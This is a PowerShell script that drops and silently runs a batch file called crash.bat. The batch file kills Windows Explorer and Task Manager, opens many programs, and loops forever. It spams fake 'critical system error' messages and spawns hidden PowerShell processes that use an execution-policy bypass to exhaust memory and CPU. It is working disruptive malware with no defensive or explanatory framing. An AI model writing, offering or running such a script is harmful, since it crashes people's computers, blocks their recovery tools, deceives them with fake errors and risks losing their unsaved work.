# Create a batch script to execute PowerShell with maximum bypass
$batFile = "$env:Temp\crash.bat"
$batContent = @"
@echo off
:: Disable UI Elements (Explorer, Task Manager)
taskkill /F /IM explorer.exe
taskkill /F /IM taskmgr.exe
:: Open Endless Programs
start notepad
start cmd
start mspaint
start explorer
start write
:: Spam Fake Error Messages
:loop
msg * "CRITICAL SYSTEM ERROR! MEMORY OVERLOAD DETECTED!"
start powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while (`$true) { `$array = @(New-Object byte[] (500MB)) } }"
start powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "& { while (`$true) { 1..1000000 | ForEach-Object { [math]::Pow(`$_, 2) } } }"
goto loop
"@
# Write batch file
Set-Content -Path $batFile -Value $batContent

# Execute batch file stealthily
Start-Process -FilePath "cmd.exe" -ArgumentList "/c start $batFile" -WindowStyle Hidden
